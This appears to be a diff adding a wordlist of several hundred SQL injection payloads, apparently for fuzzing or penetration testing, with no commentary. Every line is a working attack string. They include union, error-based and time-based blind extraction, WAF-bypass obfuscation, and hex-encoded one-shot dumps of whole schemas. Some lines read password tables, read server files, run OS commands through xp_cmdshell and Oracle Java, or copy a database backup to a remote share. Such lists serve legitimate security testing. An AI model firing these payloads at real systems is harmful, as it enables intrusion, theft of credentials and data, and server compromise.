@@ -1,0 +1,458 @@
+%00'' UNION SELECT password FROM Users WHERE username-''foobar''--
+%00' UNION SELECT password FROM Users WHERE username-'tom'--
+%0A%0d+select+user+from+dual+%0A%0D
+%0Aselect 0x00, 0x41 like/*!31337table_name*/,3 from information_schema.tables limit 1
+%0Aselect 0x00%2C 0x41 not like%2F*%2100000table_name*%2F%2C3 from information_schema.tables limit 1
+0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
+1%09and%091=1%09--
+1%0Aand%0A1=1%0A--
+1%0Band%0B1=1%0B--
+1%0Cand%0C1=1%0C--
+1%0Dand%0D1=1%0D--
+1 || 1 = 1 into outfile 'result.txt'
+(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)
+/*!12345union select*/
++/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+
+/*!13337union select*/
+15 and '1'=(SELECT '1' FROM dual) and '0having'='0having'
+["1807192982')) union se","lect 1,2,3,4,5,6,7,8,9,0,11#"]
+["1807192982')) union select 1,2,3,4,5,6,7,8,9,0,11#"]
+["1807192982')) union/**/select/**/1,/**/2,/**/3,/**/4,/**/5,/**/6,/**/7,/**/8,/**/9,/**/’pentestit’,/**/11#"]
+-1945+/*!%55NiOn*/ /*!%53eLEct*/+1,2,3,%27soy vulnerable%27,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+--+
+1%A0and%A01=1%A0--
+(1)and(1)=(1)--
+1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+1 and ascii(lower(substr(Version(),1,1)))=51
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
+1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
+1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--
+1 AND if((ascii(lower(substring((select user()),$i,1))))!=$s,1,benchmark(200000,md5(now())))
+1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
+1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --
+1 and left(version(),1)=4
+1 and right(left(version(),1),1)=5
+1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')
+(1)and(SELECT * from db.users)=(1)
+1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
+1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
+1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+1 AND (SELECT * FROM Users) = 1 
+1 and (select mid(version(),1,1)=4)
+1 and (select sleep(10) from dual where database() like '%')#
+1 and (select sleep(10) from dual where database() like 'a____')#
+1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#
+1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
+1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
+1 and substring(version(),1,1)=5
+1/*comment*/and/**/1=1/**/--
+1' GROUP BY 1,2,3--+
+1 || lpad(user,7,1)
+1 or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+1' ORDER BY 1,2,3--+
+1' ORDER BY 2--+
+1 or pg_sleep(5)--
+1) or pg_sleep(5)--
+1)) or pg_sleep(5)--
+1 or sleep(5)#
+1) or sleep(5)#
+1)) or sleep(5)#
+1;(select 1 from pg_sleep(5))
+1||(select 1 from pg_sleep(5))
+1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
+1 uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 union select 1,2,3
+1+un/**/ion+sel/**/ect+1,2,3--
+1+union+select+1,2,3--
+.1union/**_**/select/*!.1*/,2,3--+
+-1' UNION SELECT 1,2,3--+
+1 uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)
+(1)union(((((((select(1),hex(hash)from(users)))))))) /(1)or(0x50=0x50)
+-1 UNION SELECT 1 INTO @,@
+(1)union(select(1),mid(hash,1,32)from(users)) /1+union+(select'1',concat(login,hash)from+users
+1 union select username,password,3,4 from users
+1 || user_id is not null
+2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
+2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
+%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+%2c(select%20*%20from%20(select(sleep(10)))a)
+a"and/*g*/456=678-- #
+a'and/*g*/456=678-- #
+admin" #
+admin" --
+admin"/*
+admin') or '1'='1'#
+admin'or 1=1 or ''='
+ and 0=benchmark(3000000,MD5(1))%20--
+ and 0=benchmark(3000000,MD5(1))%20/*
+" and 0=benchmark(3000000,MD5(1))%20--
+" and 0=benchmark(3000000,MD5(1))%20/*
+") and 0=benchmark(3000000,MD5(1))%20--
+") and 0=benchmark(3000000,MD5(1))%20/*
+")) and 0=benchmark(3000000,MD5(1))%20--
+")) and 0=benchmark(3000000,MD5(1))%20/*
+"))) and 0=benchmark(3000000,MD5(1))%20--
+"))) and 0=benchmark(3000000,MD5(1))%20/*
+")))) and 0=benchmark(3000000,MD5(1))%20--
+")))) and 0=benchmark(3000000,MD5(1))%20/*
+' and 0=benchmark(3000000,MD5(1))%20--
+' and 0=benchmark(3000000,MD5(1))%20/*
+') and 0=benchmark(3000000,MD5(1))%20--
+') and 0=benchmark(3000000,MD5(1))%20/*
+')) and 0=benchmark(3000000,MD5(1))%20--
+')) and 0=benchmark(3000000,MD5(1))%20/*
+'))) and 0=benchmark(3000000,MD5(1))%20--
+'))) and 0=benchmark(3000000,MD5(1))%20/*
+')))) and 0=benchmark(3000000,MD5(1))%20--
+')))) and 0=benchmark(3000000,MD5(1))%20/*
+) and 0=benchmark(3000000,MD5(1))%20--
+) and 0=benchmark(3000000,MD5(1))%20/*
+)) and 0=benchmark(3000000,MD5(1))%20--
+)) and 0=benchmark(3000000,MD5(1))%20/*
+))) and 0=benchmark(3000000,MD5(1))%20--
+))) and 0=benchmark(3000000,MD5(1))%20/*
+)))) and 0=benchmark(3000000,MD5(1))%20--
+)))) and 0=benchmark(3000000,MD5(1))%20/*
+ and 0=benchmark(3000000,MD5(1))%20%23
+" and 0=benchmark(3000000,MD5(1))%20%23
+") and 0=benchmark(3000000,MD5(1))%20%23
+")) and 0=benchmark(3000000,MD5(1))%20%23
+"))) and 0=benchmark(3000000,MD5(1))%20%23
+")))) and 0=benchmark(3000000,MD5(1))%20%23
+' and 0=benchmark(3000000,MD5(1))%20%23
+') and 0=benchmark(3000000,MD5(1))%20%23
+')) and 0=benchmark(3000000,MD5(1))%20%23
+'))) and 0=benchmark(3000000,MD5(1))%20%23
+')))) and 0=benchmark(3000000,MD5(1))%20%23
+) and 0=benchmark(3000000,MD5(1))%20%23
+)) and 0=benchmark(3000000,MD5(1))%20%23
+))) and 0=benchmark(3000000,MD5(1))%20%23
+)))) and 0=benchmark(3000000,MD5(1))%20%23
+ AND 1=0
+ AND 1=0#
+ AND 1=0-- 
+ AND 1083=1083 AND (1427=1427
+ AND 1=0 AND '%'='
+ AND 1=1
+ AND 1=1#
+ AND 1=1-- 
+ AND 1=1 AND '%'='
+' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
+' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+' and 1 in (select var from temp)--
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+ AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
+ AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
+%' AND 8310=8311 AND '%'='
+AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
+AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
+AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
+AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
+' AND MID(VERSION(),1,1) = '5';
+ AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
+ AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
+AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
+AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+ AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) > hex('some_char')
+ and (select substring(@@version,3,1))='S'
+AnD SLEEP(5)
+AnD SLEEP(5)#
+AnD SLEEP(5)--
+' AnD SLEEP(5) ANd '1
+' and substr(version(),1,10) = 'PostgreSQL' and '1
+' and substr(version(),1,10) = 'PostgreXXX' and '1
+' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
+' and updatexml(null,concat(0x0a,version()),null)-- -
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=0--
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=1--
+BACKUP database master to disks='\\fake.domain\backupdb.dat'
+benchmark(10000000,MD5(1))#
++benchmark(3200,SHA1(1))+'
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))#
+benchmark(50000000,MD5(1))--
+,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
+,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
+,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
++concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+
++concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+
+create table myfile (input TEXT); load data infile '/etc/hosts' into table myfile; select * from myfile;
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp'" select * from myfile"--
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
+declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
+exec master..xp_cmdshell 'ipconfig+/all'    
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'net+view'
+'; exec master..xp_cmdshell 'ping 127.0.0.1'--
+exec master..xp_cmdshell 'ping+127.0.0.1'
+' grant connect to name; grant resource to name; --
+' GROUP BY columnnames having 1=1 --
+' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
+ HAVING 1=0
+ HAVING 1=0#
+ HAVING 1=0-- 
+ HAVING 1=1
+ HAVING 1=1#
+ HAVING 1=1-- 
+ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+injection';create table NotSoSecure (data varchar(200));--
++make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
+' || myappadmin.adduser('admin', 'newpass') || '
+ OR 1=0
+ OR 1=0#
+ OR 1=0-- 
+ OR 1=1#
+ OR 1=1-- 
+'or 123.22=123.22
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+" or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))--
+ ORDER BY 1 
+ ORDER BY 1# 
+ ORDER BY 1-- 
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)#
+ORDER BY SLEEP(5)--
+' or (EXISTS)
+' OR if(1/(length((select('a')))-1)=1,true,false) OR '
+ or isNULL(1/0) /*
+" or isNULL(1/0) /*
+" or pg_sleep(5)--
+") or pg_sleep(5)--
+")) or pg_sleep(5)--
+' or pg_sleep(5)--
+') or pg_sleep(5)--
+')) or pg_sleep(5)--
+or pg_SLEEP(5)
+or pg_SLEEP(5)#
+or pg_SLEEP(5)--
+' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
+" or sleep(5)#
+" or sleep(5)="
+") or sleep(5)="
+")) or sleep(5)="
+' or sleep(5)#
+' or sleep(5)='
+') or sleep(5)='
+')) or sleep(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+" or true--
+") or true--
+' or true--
+') or true--
+or true--
+' or uid like '%
+' or uname like '%
+ or 'unusual' = 'unusual'
+' or 'unusual' = 'unusual'
+ OR x=x
+ OR x=x#
+ OR x=x-- 
+ OR x=y
+ OR x=y#
+ OR x=y-- 
+pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)#
+pg_SLEEP(5)--
+RANDOMBLOB(1000000000/2)
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
+(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name limit 1
+select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from column_name where column_name='value' limit 1
+select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
+select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
+select current_database();
+select current server from sysibm.sysdummy1;
+select current_setting('config_file');
+select current_setting('data_directory');
+select current_setting('hba_file');
+select current_setting('krb_server_keyfile');
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('password_encryption');
+select current_setting('port');
+select current_setting('virtual_host');
+select current_user;
+SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
+SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
+SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
+(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+select * from master..sysserverse
+select * from myfile;copy myfile to /tmp/test;
+select * from pg_group;
+select * from pg_shadow;
+(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
+(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)
+(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
+,(select * from (select(sleep(10)))a)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth;
